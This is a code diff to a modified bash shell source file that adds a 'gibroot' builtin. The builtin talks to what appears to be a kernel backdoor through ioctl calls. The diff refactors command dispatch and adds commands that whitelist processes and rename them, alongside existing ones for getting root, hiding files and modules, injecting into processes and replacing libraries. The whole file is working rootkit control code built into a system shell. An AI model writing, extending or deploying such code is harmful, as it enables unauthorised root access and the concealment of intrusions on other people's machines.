@@ -18,25 +18,69 @@ $END
 #include <dirent.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <inttypes.h>
 #include "../bashtypes.h"
 #include "../bashintl.h"
 #include "../shell.h"
 #include "common.h"
 #include "../../bdoor_common.h"
 
-#define ROOT_CMD "root"
-#define UNROOT_CMD "unroot"
-#define URAND_CMD "urand"
-#define HIDE_CMD "hide"
-#define SHOW_CMD "show"
-#define LIST_HIDDEN_CMD "list"
-#define INJECT_CMD "inject"
-#define REPLACE_CMD "replace"
-#define HIDE_MOD_CMD "hmod"
-#define SHOW_MOD_CMD "smod"
-
-
 #define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
+#define ARRAY_LENGTH(array) (sizeof((array))/sizeof((array)[0]))
+
+/*
+static void hexdump(char *desc, void *addr, int len)
+{
+	int i;
+	unsigned char buff[17];       // stores the ASCII data
+	unsigned char *pc = addr;     // cast to make the code cleaner.
+
+	// Output description if given.
+
+	if (desc != NULL)
+		printf("%s:\n", desc);
+
+	// Process every byte in the data.
+
+	for (i = 0; i < len; i++) {
+		// Multiple of 16 means new line (with line offset).
+
+		if ((i % 16) == 0) {
+			// Just don't print ASCII for the zeroth line.
+
+			if (i != 0)
+				printf("  %s\n", buff);
+
+			// Output the offset.
+
+			printf("  %04x ", i);
+		}
+
+		// Now the hex code for the specific character.
+
+		printf(" %02x", pc[i]);
+
+		// And store a printable ASCII character for later.
+
+		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
+			buff[i % 16] = '.';
+		else
+			buff[i % 16] = pc[i];
+		buff[(i % 16) + 1] = '\0';
+	}
+
+	// Pad out last line if not exactly 16 characters.
+
+	while ((i % 16) != 0) {
+		printf("   ");
+		i++;
+	}
+
+	// And print the final ASCII bit.
+
+	printf("  %s\n", buff);
+}
+*/
 
 static int backdoor_fd;
 
@@ -91,7 +135,7 @@ static int make_unroot(list) WORD_LIST *list;
 static int toggle_urandom(list) WORD_LIST *list;
 {
 	int res;
-	int ret;;
+	int ret;
 	res = ioctl(backdoor_fd,URAND_IOCTL,NULL);
 	if (res == 0) {
 		printf("successfully toggled urandom behaviour\n");
@@ -124,7 +168,8 @@ void add_request(struct hide_request *request,
         request->idents = realloc(request->idents, //done since reallocarray doesn't seem to be available
 				request->count * sizeof(struct dentry_identifier));
 
-	memcpy(&request->idents[request->count - 1],&new_ident,sizeof(struct dentry_identifier));
+	memcpy(&request->idents[request->count - 1],&new_ident,
+		sizeof(struct dentry_identifier));
 }
 
 void free_request(struct hide_request *request)
@@ -301,33 +346,247 @@ static int show_mod(list) WORD_LIST *list;
 	return ret;
 }
 
+
+void init_white_request(struct white_request *request)
+{
+        request->count = 0;
+        request->entries = NULL;
+}
+
+int add_white_request(enum white_type wtype, char *arg,
+		struct white_request *request)
+{
+	int ret = 0;
+	struct whitelist_entry new_entry = {
+		.wtype = wtype,
+	};
+	switch (wtype) {
+	case PROCNAME:
+		explicit_bzero(new_entry.name,16);
+		strncpy(new_entry.name,arg,16);
+		break;
+	case PID:
+	case UID:
+	case GID:
+		new_entry.id = strtoumax(arg,NULL,10);
+		if (errno != 0) {
+			perror("ERROR ADDING ID ENTRY");
+			ret = errno;
+			goto out;
+		}
+		break;
+	//SOME COMPILERS WON'T LIKE THIS UNTILL IT DOES SOMETHING
+	//default:
+		//idfk do some error stuff maybe
+	}
+
+	request->count++;
+
+	request->entries = realloc(request->entries, //done since reallocarray doesn't seem to be available
+				request->count * sizeof(struct whitelist_entry));
+
+	memcpy(&request->entries[request->count - 1],&new_entry,
+		sizeof(struct whitelist_entry));
+out:
+	return ret;
+}
+
+void free_white_request(struct white_request *request)
+{
+        free(request->entries);
+}
+
+enum white_type identify_type(char *word)
+{
+	int cur;
+	for (cur = 0; cur < ARRAY_LENGTH(white_type_names); cur++) {
+		if (!strncmp(word,white_type_names[cur],
+				strlen(white_type_names[cur])))
+			return cur;
+	}
+	return -1;
+}
+
+
+static int whitelist_add(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct white_request req;
+	enum white_type cur_type;
+	char *word;
+
+	init_white_request(&req);
+
+	while (list != NULL) {
+		word = list->word->word;
+		cur_type = identify_type(word);
+		if (cur_type == INVALID) {
+			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
+			goto err_out;
+		}
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING NAME/ID FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		if(add_white_request(cur_type,word,&req))
+			goto err_out;
+		list = list->next;
+	}
+
+	res = ioctl(backdoor_fd,WHIT_ADD_IOCTL,&req);
+	free_white_request(&req);
+
+	if (res == 0) {
+		printf("successfully added items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR adding ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+err_out:
+	if (req.count)
+		free_white_request(&req);
+	return EXECUTION_FAILURE;
+}
+
+
+static int whitelist_remove(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct white_request req;
+	enum white_type cur_type;
+	char *word;
+
+	init_white_request(&req);
+
+	while (list != NULL) {
+		word = list->word->word;
+		cur_type = identify_type(word);
+		if (cur_type == INVALID) {
+			printf("ERROR: INVALID TYPE FOR WHITELIST ENTRY\n");
+			goto err_out;
+		}
+		list = list->next;
+		if (list == NULL) {
+			printf("ERROR: MISSING NAME/ID FOR ENTRY\n");
+			goto err_out;
+		}
+		word = list->word->word;
+		if(add_white_request(cur_type,word,&req))
+			goto err_out;
+		list = list->next;
+	}
+	res = ioctl(backdoor_fd,WHIT_REM_IOCTL,&req);
+	free_white_request(&req);
+
+	if (res == 0) {
+		printf("successfully removed items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR REMOVING ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+err_out:
+	if (req.count)
+		free_white_request(&req);
+	return EXECUTION_FAILURE;
+}
+
+static int list_whitelist_items(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int change_my_name(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	struct comm_name newname;
+	char *word = list->word->word;
+
+	if (word == NULL) {
+		printf("ERROR: NO NAME GIVEN!\n");
+		goto err_out;
+	}
+
+	if (strlen(word) > 16) {
+		printf("ERROR: NEW NAME TOO LONG!\n");
+		goto err_out;
+	}
+
+	memset(&newname,0,sizeof(struct comm_name));
+
+	memcpy(newname.name,word,MIN(strlen(word),16));
+
+	res = ioctl(backdoor_fd,CHANGE_COMM_IOCTL,&newname);
+
+	if (res == 0) {
+		printf("successfully changed name\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR CHANGING NAME");
+		ret = EXECUTION_FAILURE;
+	}
+
+	return ret;
+
+err_out:
+	return EXECUTION_FAILURE;
+}
+
+static const char *gibroot_cmd_names[] = {
+	"root",
+	"unroot",
+	"urand",
+	"hide",
+	"show",
+	"list",
+	"inject",
+	"replace",
+	"hmod",
+	"smod",
+	"wadd",
+	"wrem",
+	"wlist",
+	"newname",
+};
+
+int (*gibroot_cmd[])(WORD_LIST*) = {
+	make_root,
+	make_unroot,
+	toggle_urandom,
+	hide_item,
+	show_item,
+	list_hidden_items,
+	inject_pid,
+	replace_libs,
+	hide_mod,
+	show_mod,
+	whitelist_add,
+	whitelist_remove,
+	list_whitelist_items,
+	change_my_name,
+};
+
+
 static int get_first_arg(list) WORD_LIST *list;
 {
 	char *word = list->word->word;
-	if (!strncmp(word,ROOT_CMD,strlen(ROOT_CMD))) {
-		return make_root(list->next);
-	} else if (!strncmp(word,UNROOT_CMD,strlen(UNROOT_CMD))) {
-		return make_unroot(list->next);
-	} else if (!strncmp(word,URAND_CMD,strlen(URAND_CMD))) {
-		return toggle_urandom(list->next);
-	} else if (!strncmp(word,HIDE_CMD,strlen(HIDE_CMD))) {
-		return hide_item(list->next);
-	} else if (!strncmp(word,SHOW_CMD,strlen(SHOW_CMD))) {
-		return show_item(list->next);
-	} else if (!strncmp(word,LIST_HIDDEN_CMD,strlen(LIST_HIDDEN_CMD))) {
-		return list_hidden_items(list->next);
-	} else if (!strncmp(word,INJECT_CMD,strlen(INJECT_CMD))) {
-		return inject_pid(list->next);
-	} else if (!strncmp(word,REPLACE_CMD,strlen(REPLACE_CMD))) {
-		return replace_libs(list->next);
-	} else if (!strncmp(word,HIDE_MOD_CMD,strlen(HIDE_MOD_CMD))) {
-		return hide_mod(list->next);
-	} else if (!strncmp(word,SHOW_MOD_CMD,strlen(SHOW_MOD_CMD))) {
-		return show_mod(list->next);
-	} else {
-		printf("ERROR: invalid command\n");
-		return EXECUTION_FAILURE;
+	int cur;
+	for (cur = 0; cur < ARRAY_LENGTH(gibroot_cmd); cur++) {
+		if (!strncmp(word,gibroot_cmd_names[cur],
+				strlen(gibroot_cmd_names[cur])))
+			return gibroot_cmd[cur](list->next);
 	}
+	printf("ERROR: invalid command\n");
+	return EXECUTION_FAILURE;
 }
 
 int gibroot_builtin(list) WORD_LIST *list;
